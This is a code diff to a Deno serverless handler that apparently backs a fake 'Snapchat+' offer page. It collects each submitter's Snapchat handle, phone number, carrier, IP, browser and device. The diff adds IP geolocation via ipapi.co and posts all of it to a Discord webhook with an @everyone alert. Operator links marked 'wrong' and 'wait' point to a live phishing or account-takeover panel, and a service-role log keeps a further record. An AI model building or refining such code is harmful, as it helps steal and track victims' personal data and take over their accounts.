@@ -1,4 +1,4 @@
-import { createClient } from 'npm:@base44/sdk@0.8.31';
+import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 
 const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
 
@@ -10,7 +10,7 @@ Deno.serve(async (req) => {
     return Response.json({ error: "Unauthorized" }, { status: 401 });
   }
 
-  const base44 = createClient({ appId: Deno.env.get("BASE44_APP_ID") });
+  const base44 = createClientFromRequest(req);
   const body = await req.json();
   const { snapchat, telephone, operateur, submissionId } = body;
 
@@ -46,6 +46,15 @@ Deno.serve(async (req) => {
   const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
   const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
 
+  const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
+  let geoData = { country_name: "France", city: "Inconnue" };
+  if (geoResponse?.ok) {
+    geoData = await geoResponse.json();
+  }
+
+  const country = geoData.country_name || "France";
+  const city = geoData.city || "Inconnue";
+
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
     color: operatorColors[operateur] || 16776960,
@@ -53,7 +62,8 @@ Deno.serve(async (req) => {
       { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
       { name: "📡 Opérateur", value: operateur, inline: true },
       { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
-      { name: "🌍 Pays", value: "France", inline: true },
+      { name: "🌍 Pays", value: country, inline: true },
+      { name: "🏙️ Ville", value: city, inline: true },
       { name: "🌐 Navigateur", value: browser, inline: true },
       { name: "💾 Appareil", value: device, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: false },
@@ -72,6 +82,13 @@ Deno.serve(async (req) => {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
+  });
+
+  await base44.asServiceRole.entities.ActionLog.create({
+    submission_id: submissionId,
+    action: "submitted",
+    details: { browser, device, ip, country, city },
+    timestamp: now.toISOString()
   });
 
   return Response.json({ ok: true });
